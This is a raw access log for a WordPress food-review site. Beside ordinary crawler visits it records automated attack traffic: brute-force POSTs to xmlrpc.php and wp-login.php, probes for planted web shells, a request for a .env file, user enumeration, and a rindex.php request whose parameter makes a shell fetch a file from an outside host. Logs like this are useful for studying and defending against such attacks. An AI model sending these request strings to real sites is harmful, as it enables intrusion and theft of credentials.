185.220.101.0 - - [01/Dec/2023:02:34:03 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" "-"
185.220.101.0 - - [01/Dec/2023:02:34:04 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" "-"
185.220.101.0 - - [01/Dec/2023:02:34:05 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" "-"
213.180.203.0 - - [01/Dec/2023:02:36:48 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
213.180.203.0 - - [01/Dec/2023:02:36:49 -0500] "GET /?p=373 HTTP/1.1" 301 - www.edibledialect.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
213.180.203.0 - - [01/Dec/2023:02:36:50 -0500] "GET /brooklyn/di-fara-pizza HTTP/1.1" 200 31135 www.edibledialect.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
157.245.198.0 - - [01/Dec/2023:02:38:35 -0500] "GET /wp-admin/css/colors/blue/atomlib.php HTTP/1.1" 301 - edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:02:38:36 -0500] "GET /wp-admin/css/colors/blue/atomlib.php HTTP/1.1" 404 18409 www.edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
87.250.224.0 - - [01/Dec/2023:02:44:23 -0500] "GET /brooklyn/di-fara-pizza HTTP/1.1" 200 31135 www.edibledialect.com "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "-"
198.20.245.0 - - [01/Dec/2023:02:48:03 -0500] "GET /sample.php?pd=1&mapname=ovalxnmai.php&a=vx000&dstr=43%20434 HTTP/1.1" 301 - edibledialect.com "edibledialect.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) colonel Chrome/196.3.1597.530 Safari/537.36" "-"
198.20.245.0 - - [01/Dec/2023:02:48:04 -0500] "GET /sample.php?pd=1&mapname=ovalxnmai.php&a=vx000&dstr=43%20434 HTTP/1.1" 404 18399 www.edibledialect.com "edibledialect.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) colonel Chrome/196.3.1597.530 Safari/537.36" "-"
198.20.245.0 - - [01/Dec/2023:02:49:01 -0500] "GET /index.php?pd=1&mapname=ovalxnmai.php&a=vx000&dstr=43%20434 HTTP/1.1" 301 - edibledialect.com "edibledialect.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) colonel Chrome/196.3.1597.530 Safari/537.36" "-"
74.208.59.0 - - [01/Dec/2023:02:49:02 -0500] "POST /wp-cron.php?doing_wp_cron=1701416942.1319980621337890625000 HTTP/1.1" 200 - www.edibledialect.com "http://www.edibledialect.com/wp-cron.php?doing_wp_cron=1701416942.1319980621337890625000" "WordPress/5.5.13; http://www.edibledialect.com" "-"
198.20.245.0 - - [01/Dec/2023:02:49:03 -0500] "GET /?pd=1&mapname=ovalxnmai.php&a=vx000&dstr=43%20434 HTTP/1.1" 200 55390 www.edibledialect.com "edibledialect.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) colonel Chrome/196.3.1597.530 Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:15 -0500] "GET /robots.txt HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:16 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "http://edibledialect.com/robots.txt" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:16 -0500] "GET /wp-sitemap.xml HTTP/1.1" 200 657 www.edibledialect.com "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:17 -0500] "GET /humans.txt HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:17 -0500] "GET /humans.txt HTTP/1.1" 404 18409 www.edibledialect.com "http://edibledialect.com/humans.txt" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:18 -0500] "GET /ads.txt HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:19 -0500] "GET /ads.txt HTTP/1.1" 404 18409 www.edibledialect.com "http://edibledialect.com/ads.txt" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:19 -0500] "GET / HTTP/1.1" 301 - edibledialect.com "-" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
93.158.90.0 - - [01/Dec/2023:02:49:20 -0500] "GET / HTTP/1.1" 200 54810 www.edibledialect.com "http://edibledialect.com/" "Mozilla/5.0 (Linux; Android 12; SM-G781W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36" "-"
51.222.253.0 - - [01/Dec/2023:02:50:01 -0500] "GET / HTTP/1.1" 200 54800 www.edibledialect.com "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "-"
157.245.198.0 - - [01/Dec/2023:02:55:07 -0500] "GET /wp-content/plugins/woocommerce-payments/readme.txt HTTP/1.1" 301 - edibledialect.com "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:02:55:08 -0500] "GET /wp-content/plugins/woocommerce-payments/readme.txt HTTP/1.1" 404 18409 www.edibledialect.com "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
64.227.164.0 - - [01/Dec/2023:02:55:14 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
64.227.164.0 - - [01/Dec/2023:02:55:26 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
64.227.164.0 - - [01/Dec/2023:02:55:26 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
3.236.244.0 - - [01/Dec/2023:03:18:30 -0500] "GET / HTTP/1.1" 200 54810 www.edibledialect.com "-" "Mozilla/5.0 (Linux; U; Android 9; zh-cn; PCCM00 Build/PKQ1.190223.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/20.6.0.0.2beta" "-"
3.236.244.0 - - [01/Dec/2023:03:19:09 -0500] "GET / HTTP/1.1" 200 54800 www.edibledialect.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1" "-"
62.210.245.0 - - [01/Dec/2023:03:20:00 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
62.210.245.0 - - [01/Dec/2023:03:20:00 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
62.210.245.0 - - [01/Dec/2023:03:20:00 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
44.221.69.0 - - [01/Dec/2023:03:22:40 -0500] "GET /robots.txt HTTP/1.1" 200 172 www.edibledialect.com "-" "ClaudeBot" "-"
44.221.69.0 - - [01/Dec/2023:03:22:42 -0500] "GET /category/noodles HTTP/1.1" 200 29372 www.edibledialect.com "-" "ClaudeBot" "-"
74.208.59.0 - - [01/Dec/2023:03:35:09 -0500] "POST /wp-cron.php?doing_wp_cron=1701419709.6987230777740478515625 HTTP/1.1" 200 - www.edibledialect.com "http://www.edibledialect.com/wp-cron.php?doing_wp_cron=1701419709.6987230777740478515625" "WordPress/5.5.13; http://www.edibledialect.com" "-"
157.245.198.0 - - [01/Dec/2023:03:35:09 -0500] "GET /wp-includes/js/tinymce/skins/lightgray/img/index.php?p= HTTP/1.1" 301 - edibledialect.com "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:03:35:10 -0500] "GET /wp-includes/js/tinymce/skins/lightgray/img/ HTTP/1.1" 403 1271 www.edibledialect.com "www.google.com" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
40.77.167.0 - - [01/Dec/2023:03:57:42 -0500] "GET /wp-sitemap-taxonomies-category-1.xml HTTP/1.1" 200 2853 www.edibledialect.com "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" "-"
192.44.68.0 - - [01/Dec/2023:04:07:14 -0500] "GET /wp-content/uploads/2017/04/mt.png HTTP/1.1" 200 765594 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" "-"
192.44.68.0 - - [01/Dec/2023:04:07:14 -0500] "GET /wp-content/uploads/2017/07/o.jpg HTTP/1.1" 200 66069 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" "-"
192.44.68.0 - - [01/Dec/2023:04:07:15 -0500] "GET /wp-content/uploads/2018/01/Ramen-lab.jpg HTTP/1.1" 200 345206 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" "-"
192.44.68.0 - - [01/Dec/2023:04:07:15 -0500] "GET /wp-content/uploads/2016/11/decibel.jpg HTTP/1.1" 200 94140 www.edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" "-"
8.219.51.0 - - [01/Dec/2023:04:09:59 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
8.219.51.0 - - [01/Dec/2023:04:10:00 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
8.219.51.0 - - [01/Dec/2023:04:10:01 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
107.189.2.0 - - [01/Dec/2023:04:10:24 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" "-"
107.189.2.0 - - [01/Dec/2023:04:10:25 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" "-"
107.189.2.0 - - [01/Dec/2023:04:10:26 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" "-"
107.189.2.0 - - [01/Dec/2023:04:10:27 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" "-"
107.189.2.0 - - [01/Dec/2023:04:10:28 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134" "-"
185.220.101.0 - - [01/Dec/2023:04:27:23 -0500] "GET /wp-login.php/wp-login.php HTTP/1.1" 200 6678 edibledialect.com "http://edibledialect.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:65.0) Gecko/20100101 Firefox/65.0" "-"
185.220.101.0 - - [01/Dec/2023:04:27:23 -0500] "POST /wp-login.php/wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "-" "-"
51.222.253.0 - - [01/Dec/2023:04:48:50 -0500] "GET /category/steakhouse HTTP/1.1" 200 23630 www.edibledialect.com "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" "-"
74.208.59.0 - - [01/Dec/2023:04:48:51 -0500] "POST /wp-cron.php?doing_wp_cron=1701424131.1537780761718750000000 HTTP/1.1" 200 - www.edibledialect.com "http://www.edibledialect.com/wp-cron.php?doing_wp_cron=1701424131.1537780761718750000000" "WordPress/5.5.13; http://www.edibledialect.com" "-"
185.220.102.0 - - [01/Dec/2023:04:51:53 -0500] "GET /wp-login.php/wp-login.php HTTP/1.1" 200 6678 edibledialect.com "http://edibledialect.com/wp-login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
185.220.102.0 - - [01/Dec/2023:04:51:54 -0500] "POST /wp-login.php/wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "-" "-"
160.91.195.0 - - [01/Dec/2023:04:58:57 -0500] "GET /wp-content/uploads/2017/06/difara.jpg HTTP/1.1" 200 430182 www.edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" "-"
160.91.195.0 - - [01/Dec/2023:04:58:57 -0500] "GET /wp-content/uploads/2016/11/fet.jpg HTTP/1.1" 200 1163336 www.edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" "-"
160.91.195.0 - - [01/Dec/2023:04:58:57 -0500] "GET /wp-content/uploads/2016/11/Talde.jpg HTTP/1.1" 200 224505 www.edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0" "-"
67.227.227.0 - - [01/Dec/2023:05:02:08 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36" "-"
104.244.122.0 - - [01/Dec/2023:05:02:11 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/29.0" "-"
103.127.198.0 - - [01/Dec/2023:05:02:19 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "-"
8.214.83.0 - - [01/Dec/2023:05:02:25 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0" "-"
139.59.47.0 - - [01/Dec/2023:05:02:29 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36" "-"
93.107.1.0 - - [01/Dec/2023:05:02:33 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" "-"
67.227.227.0 - - [01/Dec/2023:05:02:34 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" "-"
93.107.1.0 - - [01/Dec/2023:05:02:37 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" "-"
67.227.227.0 - - [01/Dec/2023:05:02:37 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "-"
139.59.24.0 - - [01/Dec/2023:05:02:45 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0" "-"
93.107.1.0 - - [01/Dec/2023:05:02:46 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (Linux; Android 10; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36" "-"
2001:41d0:: - - [01/Dec/2023:05:02:50 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0" "-"
103.127.198.0 - - [01/Dec/2023:05:02:52 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.80 Mobile/15E148 Safari/604.1" "-"
51.77.195.0 - - [01/Dec/2023:05:02:52 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36" "-"
52.167.144.0 - - [01/Dec/2023:05:15:09 -0500] "GET /wp-sitemap-taxonomies-category-1.xml HTTP/1.1" 200 2853 www.edibledialect.com "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" "-"
52.167.144.0 - - [01/Dec/2023:05:15:10 -0500] "GET /wp-sitemap-taxonomies-category-1.xml HTTP/1.1" 200 2853 www.edibledialect.com "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" "-"
2a01:4f8:100:: - - [01/Dec/2023:05:24:03 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
2a01:4f8:100:: - - [01/Dec/2023:05:24:15 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
2a01:4f8:100:: - - [01/Dec/2023:05:24:15 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
109.70.100.0 - - [01/Dec/2023:05:26:34 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" "-"
109.70.100.0 - - [01/Dec/2023:05:26:35 -0500] "POST /xmlrpc.php HTTP/1.1" 200 403 edibledialect.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" "-"
109.70.100.0 - - [01/Dec/2023:05:26:36 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" "-"
109.70.100.0 - - [01/Dec/2023:05:26:37 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" "-"
109.70.100.0 - - [01/Dec/2023:05:26:38 -0500] "POST /xmlrpc.php HTTP/1.1" 403 1271 edibledialect.com "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" "-"
157.230.42.0 - - [01/Dec/2023:05:43:46 -0500] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 200 1045 edibledialect.com "-" "python-requests/2.21.0" "-"
74.208.59.0 - - [01/Dec/2023:05:43:47 -0500] "POST /wp-cron.php?doing_wp_cron=1701427427.8301260471343994140625 HTTP/1.1" 200 - www.edibledialect.com "http://www.edibledialect.com/wp-cron.php?doing_wp_cron=1701427427.8301260471343994140625" "WordPress/5.5.13; http://www.edibledialect.com" "-"
157.230.42.0 - - [01/Dec/2023:05:43:47 -0500] "GET /administrator/index.php HTTP/1.1" 301 - edibledialect.com "-" "python-requests/2.21.0" "-"
157.230.42.0 - - [01/Dec/2023:05:43:48 -0500] "GET /administrator/ HTTP/1.1" 404 18399 www.edibledialect.com "-" "python-requests/2.21.0" "-"
157.230.42.0 - - [01/Dec/2023:05:43:49 -0500] "GET /view-source: HTTP/1.1" 301 - edibledialect.com "-" "python-requests/2.21.0" "-"
157.230.42.0 - - [01/Dec/2023:05:43:50 -0500] "GET /view-source: HTTP/1.1" 404 18399 www.edibledialect.com "-" "python-requests/2.21.0" "-"
157.230.42.0 - - [01/Dec/2023:05:43:51 -0500] "GET /misc/ajax.js HTTP/1.1" 301 - edibledialect.com "-" "python-requests/2.21.0" "-"
157.230.42.0 - - [01/Dec/2023:05:43:52 -0500] "GET /misc/ajax.js HTTP/1.1" 404 18399 www.edibledialect.com "-" "python-requests/2.21.0" "-"
207.46.13.0 - - [01/Dec/2023:05:47:09 -0500] "GET /sitemap.xml HTTP/1.1" 200 801 www.edibledialect.com "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" "-"
207.46.13.0 - - [01/Dec/2023:05:47:09 -0500] "GET /sitemap.xml HTTP/1.1" 200 801 www.edibledialect.com "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" "-"
173.249.19.0 - - [01/Dec/2023:05:49:19 -0500] "GET /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
173.249.19.0 - - [01/Dec/2023:05:49:31 -0500] "POST /wp-login.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
173.249.19.0 - - [01/Dec/2023:05:49:31 -0500] "POST /xmlrpc.php HTTP/1.1" 503 299 edibledialect.com "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0" "-"
206.84.102.0 - - [01/Dec/2023:05:53:41 -0500] "GET /wp-login.php HTTP/1.1" 200 6678 edibledialect.com "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0" "-"
206.84.102.0 - - [01/Dec/2023:05:53:42 -0500] "GET /wp-json/wp/v2/users HTTP/1.1" 200 655 edibledialect.com "" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0" "-"
92.119.36.0 - - [01/Dec/2023:05:56:07 -0500] "GET /.env HTTP/1.1" 404 18409 www.edibledialect.com "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" "-"
92.119.36.0 - - [01/Dec/2023:05:56:08 -0500] "POST / HTTP/1.1" 200 54810 www.edibledialect.com "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" "-"
157.245.198.0 - - [01/Dec/2023:06:06:32 -0500] "GET /rindex.php?parameter=RxRzjfoh.php%7Chttp://ndot.us/za&action=add HTTP/1.1" 301 - edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
157.245.198.0 - - [01/Dec/2023:06:06:32 -0500] "GET /rindex.php?parameter=RxRzjfoh.php%7Chttp://ndot.us/za&action=add HTTP/1.1" 404 18409 www.edibledialect.com "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36" "-"
